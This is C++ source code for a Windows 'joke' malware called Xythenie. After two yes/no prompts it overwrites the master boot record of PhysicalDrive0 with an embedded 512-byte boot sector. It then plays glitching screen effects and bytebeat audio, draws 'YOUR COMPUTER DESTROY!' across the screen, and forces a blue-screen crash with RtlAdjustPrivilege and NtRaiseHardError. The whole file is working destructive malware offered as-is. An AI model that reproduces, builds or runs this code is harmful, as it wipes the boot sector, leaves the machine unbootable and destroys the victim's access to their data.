#define _USE_MATH_DEFINES 1
#include <Windows.h>
#include <cmath>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "kernel32.lib")
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidRespnseOption, PULONG Response);
const unsigned char MasterBootRecord[] = {
	0xB8, 0x13, 0x00, 0xCD, 0x10, 0xFC, 0xB8, 0x00, 0xA0, 0x8E, 0xD8, 0x8E,
	0xC0, 0xB4, 0x04, 0xA3, 0x90, 0xFC, 0x31, 0xC0, 0xB9, 0x48, 0x7E, 0x31,
	0xFF, 0xF3, 0xAB, 0x8B, 0x05, 0x40, 0x40, 0xAB, 0x88, 0xC4, 0x92, 0xB8,
	0x00, 0x1C, 0xAB, 0xB8, 0x98, 0xE6, 0xAB, 0xB8, 0x28, 0x14, 0xBB, 0x10,
	0x25, 0xB1, 0x0B, 0xAB, 0x83, 0xC0, 0x16, 0x93, 0xAB, 0xFE, 0xC4, 0x93,
	0xE2, 0xF5, 0x05, 0x8E, 0x15, 0x80, 0xFF, 0x5C, 0x75, 0xEB, 0xBF, 0xA0,
	0xD4, 0xB1, 0x05, 0xB8, 0x04, 0x0B, 0xE8, 0x85, 0x01, 0x83, 0xC7, 0x3C,
	0xE2, 0xF5, 0xBE, 0x96, 0xFC, 0x80, 0x7C, 0x02, 0x20, 0x72, 0x2D, 0xFE,
	0xC5, 0x80, 0xFD, 0x37, 0x74, 0xAC, 0xAD, 0x97, 0xAD, 0x3C, 0x28, 0x74,
	0x0B, 0x3C, 0x20, 0x75, 0x04, 0xC6, 0x44, 0xFE, 0x28, 0xE8, 0x5E, 0x01,
	0x81, 0xFE, 0x72, 0xFD, 0x75, 0xDB, 0x88, 0xF0, 0x2C, 0x02, 0x72, 0xD2,
	0x34, 0x01, 0x88, 0xC2, 0x88, 0xC6, 0xEB, 0xCA, 0x80, 0x74, 0x02, 0x08,
	0x45, 0x83, 0xE5, 0x07, 0x52, 0x56, 0x55, 0x75, 0x0E, 0xB4, 0x00, 0xCD,
	0x1A, 0x3B, 0x16, 0x8C, 0xFC, 0x74, 0xF6, 0x89, 0x16, 0x8C, 0xFC, 0xBE,
	0x80, 0xFC, 0xB9, 0x04, 0x00, 0xAD, 0x3D, 0x40, 0x01, 0x97, 0x72, 0x43,
	0xE8, 0x17, 0x01, 0x81, 0xEF, 0x42, 0x01, 0x8A, 0x05, 0x2C, 0x20, 0x72,
	0x29, 0x56, 0x57, 0xB4, 0x04, 0xF6, 0xE4, 0x01, 0xC6, 0xAD, 0x97, 0xC6,
	0x04, 0x20, 0xB8, 0x08, 0x0E, 0xE8, 0x02, 0x01, 0x5F, 0x5E, 0xEB, 0x1F,
	0xAD, 0x09, 0xC0, 0x74, 0x2D, 0x3D, 0x00, 0xF0, 0x97, 0x73, 0x14, 0xE8,
	0xE8, 0x00, 0x81, 0xC7, 0x3E, 0x01, 0xB8, 0x0C, 0x0C, 0x89, 0x7C, 0xFE,
	0x80, 0xBD, 0x40, 0x01, 0x0B, 0x75, 0x05, 0x31, 0xC0, 0x89, 0x44, 0xFE,
	0x80, 0x3D, 0x1C, 0x75, 0x06, 0xC7, 0x06, 0x92, 0xFC, 0x38, 0x0A, 0xE8,
	0xC6, 0x00, 0xE2, 0xCC, 0xBE, 0x92, 0xFC, 0xAD, 0x08, 0xC0, 0x74, 0x0C,
	0x04, 0x08, 0x75, 0x08, 0xB4, 0x1C, 0xFE, 0x0E, 0x91, 0xFC, 0x78, 0x4A,
	0x89, 0x44, 0xFE, 0x8B, 0x3C, 0xE8, 0xAE, 0x00, 0x75, 0x2E, 0xB4, 0x02,
	0xCD, 0x16, 0xA8, 0x04, 0x74, 0x02, 0x4F, 0x4F, 0xA8, 0x08, 0x74, 0x02,
	0x47, 0x47, 0xA8, 0x03, 0x74, 0x0D, 0x83, 0x3E, 0x80, 0xFC, 0x00, 0x75,
	0x06, 0x8D, 0x45, 0x08, 0xA3, 0x80, 0xFC, 0x97, 0x3D, 0xFE, 0xE5, 0x74,
	0x07, 0x3D, 0x32, 0xE7, 0x74, 0x02, 0x89, 0x04, 0x5D, 0x5E, 0x5A, 0x8B,
	0x04, 0x80, 0xFA, 0x01, 0x76, 0x0A, 0x05, 0x80, 0x02, 0x3D, 0x80, 0xD4,
	0x72, 0x1B, 0xEB, 0xFE, 0x48, 0x48, 0x72, 0x03, 0x83, 0xC0, 0x04, 0x50,
	0xD1, 0xE8, 0xB1, 0xA0, 0xF6, 0xF1, 0xFE, 0xCC, 0x80, 0xFC, 0x94, 0x58,
	0x72, 0x03, 0x80, 0xCE, 0x16, 0x89, 0x04, 0x05, 0x06, 0x0F, 0x93, 0xB9,
	0x03, 0x00, 0xE4, 0x40, 0x3C, 0xFC, 0x72, 0x0D, 0xBF, 0x82, 0xFC, 0x83,
	0x3D, 0x00, 0x74, 0x03, 0xAF, 0xE2, 0xF8, 0x89, 0x1D, 0xE9, 0xC2, 0xFE,
	0x18, 0x18, 0x3C, 0x24, 0x3C, 0x7E, 0xFF, 0x24, 0x00, 0x80, 0x42, 0x18,
	0x10, 0x48, 0x82, 0x01, 0x00, 0xBD, 0xDB, 0x7E, 0x24, 0x3C, 0x66, 0xC3,
	0x00, 0x3C, 0x5A, 0xFF, 0xA5, 0x3C, 0x66, 0x66, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x72, 0x02, 0x31, 0xC0, 0x89, 0x85, 0x40, 0x01,
	0xAB, 0xC3, 0x51, 0x57, 0x9C, 0x50, 0xBB, 0xA4, 0x7D, 0x2E, 0xD7, 0x93,
	0xB9, 0x0A, 0x00, 0xF8, 0x88, 0xF8, 0x88, 0xFC, 0xE8, 0xE1, 0xFF, 0xD0,
	0xE3, 0xE2, 0xF5, 0x81, 0xC7, 0x6C, 0x02, 0x58, 0x40, 0xA8, 0x07, 0x75,
	0xE0, 0x9D, 0x5F, 0x59, 0xC3, 0x4F, 0x55, 0xAA
};

void mbr()
{    
    DWORD dwBytesWritten;
    HANDLE hDevice = CreateFileW(
        L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
        OPEN_EXISTING, 0, 0);
    WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
    CloseHandle(hDevice);
}

DWORD WINAPI payload1(LPVOID lpParam) {
	while(1){
    HDC hdc = GetDC(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN),
        h = GetSystemMetrics(SM_CYSCREEN);
    HBRUSH brush = CreateSolidBrush(RGB(rand() % 100, rand() % 100, rand() % 100));
    SelectObject(hdc, brush);
    PatBlt(hdc, 0, 0, w, h, PATINVERT);
    DeleteObject(brush);
    ReleaseDC(NULL, hdc);
	}
}
DWORD WINAPI payload2(LPVOID lpParam) {
	int ticks = GetTickCount(), w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC hdc = GetDC(0), hdcMem = CreateCompatibleDC(hdc);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcMem, hbm);
		BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		int v = 0;BYTE bt = 0;
		if ((GetTickCount() - ticks) > 60000) bt = rand() & 0xffffff;
		for (int i = 0; w * h > i; i++) {
			if (i % h == 0 && rand() % 100 == 0) v = rand() % 50;
			((BYTE*)(data + i))[v ? 252 : 252] += ((BYTE*)(data + i))[i % 3] ^ bt;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		DeleteObject(hbm); DeleteObject(hdcMem);
		DeleteObject(hdc);
	}
}
DWORD WINAPI payload2dot1(LPVOID lpParam) {
    HDC hdc;
    int sx = 0, sy = 0;
    LPCWSTR lpText = L"HAHAHAHAHA YOUR COMPUTER DESTROY!";
    while(1)
    {
        hdc = GetWindowDC(GetDesktopWindow());
        sx = GetSystemMetrics(0);
        sy = GetSystemMetrics(1);
        TextOutW(hdc, rand() % sx, rand() % sy, lpText, wcslen(lpText));
        Sleep(100);
    }
}
DWORD WINAPI payload3(LPVOID lpParam) {
    HDC hWindow;
    HDC hDsktp;
    HWND hWnd;
    RECT wRect;
    int dX = 0;
    int dY = 0;
    int dW;
    int dH;
    POINT lppoint[3];
    int counter = 30;
    while (true)
    {
        hWnd = GetDesktopWindow();
        hWindow = GetWindowDC(hWnd);
        hDsktp = GetDC(0);
        GetWindowRect(hWnd, &wRect);
        dW = GetSystemMetrics(0);
        dH = GetSystemMetrics(0);
        lppoint[0].x = wRect.left + counter;
        lppoint[0].y = wRect.top - counter;
        lppoint[1].x = wRect.right + counter;
        lppoint[1].y = wRect.top + counter;
        lppoint[2].x = wRect.left - counter;
        lppoint[2].y = wRect.bottom - counter;
        PlgBlt(hDsktp, lppoint, hDsktp, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
        if (counter < 15) counter++;
        if (counter < 65) counter--;
        ReleaseDC(0,  hDsktp);
    }
} 
DWORD WINAPI payload4(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    HDC hdc, hdcMem; HBITMAP hbm;
    for (int i = 0;; i++, i %= 6) {
        hdc = GetDC(0); hdcMem = CreateCompatibleDC(hdc); hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcMem, hbm);
        BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY); GetBitmapBits(hbm, w * h * 4, data);
        for (int i = 0; w * h > i; i++) {
            int x = i * w + i, y = i * h + i, f = (y | y + y + -1 + x + w / h);
            ((BYTE*)(data + i))[4] = (f / 1);
        }
        SetBitmapBits(hbm, w * h * 4, data); BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCERASE);
        DeleteObject(hbm); DeleteObject(hdcMem);
        DeleteObject(hdc);
        Sleep(rand() % 100);
    }
}
VOID WINAPI ci(int x, int y, int w, int h)
{
    HDC hdc = GetDC(0);
    HRGN hrgn = CreateEllipticRgn(x, y, w+x, h+y);
    SelectClipRgn(hdc, hrgn);
    BitBlt(hdc, x, y, w, h, hdc, x, y, NOTSRCCOPY);
    DeleteObject(hrgn);
    ReleaseDC(NULL, hdc);
}
DWORD WINAPI payload5(LPVOID lpParam) {
    RECT rect;
    GetWindowRect(GetDesktopWindow(), &rect);
    int w = rect.right - rect.left - 500, h = rect.bottom - rect.top - 500;
    for (int t = 0;; t++)
    {
        const int size = 1000;
        int x = rand()%(w+size)-size/2, y = rand()%(h+size)-size/2;
        for (int i = 0; i < size; i+=100)
        {
            ci(x-i/2, y-i/2, i, i);
            Sleep(10);
        }
    }
}
DWORD WINAPI payload6(LPVOID lpParam) {
  HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
  int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
  double angle = 0;
  while (1) {
    desk = GetDC(0);
    for (float i = 0; i < sw + sh; i += 0.99f) {
      int a = sin(angle) * 20;
      BitBlt(desk, 0, i, sw, 1, desk, a, i, SRCCOPY);
      angle += M_PI / 40;
      DeleteObject(&i); DeleteObject(&a);
    }
    ReleaseDC(wnd, desk);
    DeleteDC(desk); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&angle);
  }
}
VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t+(t&t*t>>6)-t*(t>>9&(t%16?2:6)&t>>9));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[16000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t/8)>>(t>>9)*t/((t>>14&3)+4);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*(t>>4|t>>9)>>(t>>15));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t&4096)?((t*(t^t%255)|(t>>4))>>1):(t>>3)|((t&8192)?t<<2:t);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[16000 * 15] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t&t+t/256)&64);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 15] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t^t*t>>5|(t<<3)+12*t*(t>>13|(t>>1|t>>10|t>>2)&t>>8));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d)
{
    if (MessageBoxW(NULL, L"Run Malware?", L"Warning! - Xythenie", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
    {
        ExitProcess(0);
    }
    else
    {
        if (MessageBoxW(NULL, L"Are You Sure?", L"Last Waring! - Xythenie", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
        {
            ExitProcess(0);
        }
        else
        {
            mbr();
            HANDLE thread1 = CreateThread(0, 0, payload1, 0, 0, 0);
            sound1();
            Sleep(30000);
            TerminateThread(thread1, 0);
            CloseHandle(thread1);
            InvalidateRect(0, 0, 0);
            HANDLE thread2 = CreateThread(0, 0, payload2, 0, 0, 0);
            HANDLE thread2dot1 = CreateThread(0, 0, payload2dot1, 0, 0, 0);
            sound2();
            Sleep(30000);
            TerminateThread(thread2, 0);
            TerminateThread(thread2dot1, 0);
            CloseHandle(thread2);
            CloseHandle(thread2dot1);
            InvalidateRect(0, 0, 0);
            HANDLE thread3 = CreateThread(0, 0, payload3, 0, 0, 0);
            sound3();
            Sleep(30000);
            TerminateThread(thread3, 0);
            CloseHandle(thread3);
            InvalidateRect(0, 0, 0);
            HANDLE thread4 = CreateThread(0, 0, payload4, 0, 0, 0);
            sound4();
            Sleep(30000);
            TerminateThread(thread4, 0);
            CloseHandle(thread4);
            InvalidateRect(0, 0, 0);
            HANDLE thread5 = CreateThread(0, 0, payload5, 0, 0, 0);
            Sleep(15000);
            TerminateThread(thread5, 0);
            CloseHandle(thread5);
            InvalidateRect(0, 0, 0);
            HANDLE thread6 = CreateThread(0, 0, payload6, 0, 0, 0);
            sound6();
            Sleep(15000);
            BOOLEAN b;
				     unsigned long response;
				     RtlAdjustPrivilege(19, true, false, &b);
				     NtRaiseHardError(0xC000008C, 0, 0, 0, 6, &response);	
            Sleep(-1);
        }
    }
}
